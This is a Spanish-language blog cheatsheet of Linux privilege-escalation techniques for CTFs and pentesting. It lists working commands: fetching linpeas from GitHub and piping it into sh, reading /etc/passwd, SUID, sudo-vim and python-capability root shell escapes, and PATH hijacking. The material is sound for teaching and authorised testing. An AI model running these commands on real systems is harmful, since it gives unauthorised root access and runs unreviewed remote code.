---
layout: blog
title: "Cheatsheet: Escalada de Privilegios en Linux"
category: cheatsheet
read_time: 8
date: 2026-03-10
tags: [linux, privesc, suid, sudo, capabilities]
description: "Referencia rápida de técnicas de escalada de privilegios en Linux para CTFs y pentesting."
---

Una referencia rápida que uso en mis CTFs para no olvidar ninguna técnica de privesc.

## 1. Enumeración inicial

Siempre empezar con **linpeas**:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

O manual:

```bash
id && whoami
uname -a
cat /etc/passwd | grep -v nologin
sudo -l
```

## 2. SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

Consulta [GTFOBins](https://gtfobins.github.io) para explotar cada binario.

Ejemplo con `find`:
```bash
find . -exec /bin/sh \; -quit
```

## 3. Sudo

```bash
sudo -l
```

Si tienes algo como `(ALL) NOPASSWD: /usr/bin/vim`:

```bash
sudo vim -c ':!/bin/bash'
```

## 4. Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
```

Busca scripts que puedas modificar o paths mal configurados.

## 5. Capabilities

```bash
getcap -r / 2>/dev/null
```

`python3 cap_setuid+ep` → `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

## 6. Variables de entorno PATH

Si un script ejecuta comandos sin path absoluto:

```bash
echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
./script_vulnerable
```

## Recursos

- [GTFOBins](https://gtfobins.github.io)
- [HackTricks - Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
